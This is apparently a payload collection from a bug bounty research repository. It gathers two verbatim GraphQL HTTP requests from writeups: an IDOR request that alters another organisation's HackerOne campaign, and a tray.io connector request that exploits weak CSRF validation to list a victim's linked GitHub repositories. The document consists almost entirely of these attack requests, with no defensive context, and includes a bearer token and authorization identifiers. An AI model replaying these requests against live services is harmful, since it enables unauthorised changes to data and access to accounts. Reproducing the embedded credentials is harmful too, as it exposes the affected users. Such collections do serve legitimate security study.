# Payloads — graphql

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. Insecure Direct Object Reference (IDOR) - Delete Campaigns
- Source: `telegram writeups (verbatim excerpts)`

```
POST /graphql HTTP/2
Host: hackerone.com
Cookie: yourcookie
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://hackerone.com/organizations/opensea_demo/campaigns/242/edit
Content-Type: application/json
X-Csrf-Token: ███
X-Product-Area: campaigns
X-Product-Feature: edit
X-Datadog-Origin: rum
X-Datadog-Parent-Id: 9027318766950450042
X-Datadog-Sampling-Priority: 1
X-Datadog-Trace-Id: 87799383677632658
Content-Length: 851
Origin: https://hackerone.com
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"operationName":"UpdateCampaign","variables":{"product_area":"campaigns","product_feature":"edit","input":{"campaign_id":"Z2lkOi8vaGFja2Vyb25lL0NhbXBhaWduLzI0NA==","team_id":"Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzU3MzI4","bounty_table_row_id":"Z2lkOi8vaGFja2Vyb25lL0JvdW50eVRhYmxlUm93LzEwODM2","start_date":"2023-05-05T09:00:00Z","end_date":"2023-05-08T05:00:00Z","critical":3,"high":2,"medium":1.5,"low":1.5,"structured_scope_ids":[],"researchers_information":"ccccccccccccccc"}},"query":"mutation UpdateCampaign($input: UpdateCampaignInput!) {\n  updateCampaign(input: $input) {\n    was_successful\n    errors {\n      edges {\n        node {\n          id\n          type\n          field\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

## 2. Improper CSRF token validation allows attackers to access victim's accounts linked to Hackerone
- Source: `telegram writeups (verbatim excerpts)`

```
POST /graphql HTTP/2
Host: tray.io
Content-Length: 512
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Accept: */*
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
Authorization: Bearer aad14176400b44bb97b703b4ae1077a5c84c3b7f97e34f5383643c1c8a22cdf4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://hackerone.integration-configuration.com
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://hackerone.integration-configuration.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{"operationName":"CallConnector","variables":{"input":{"connector":"github","version":"2.2","operation":"raw_http_request","authId":"22583997-4aa0-4bb8-87cb-28326dc97868","input":"{\"method\":\"GET\",\"parse_response\":\"true\",\"include_raw_body\":\"false\",\"url\":{\"endpoint\":\"/user/repos?per_page=50&page=1&affiliation=owner%2Ccollaborator%2Corganization_member\"}}"}},"query":"mutation CallConnector($input: ConnectorCallInput!) {\n  callConnector(input: $input) {\n    output\n    __typename\n  }\n}\n"}
```
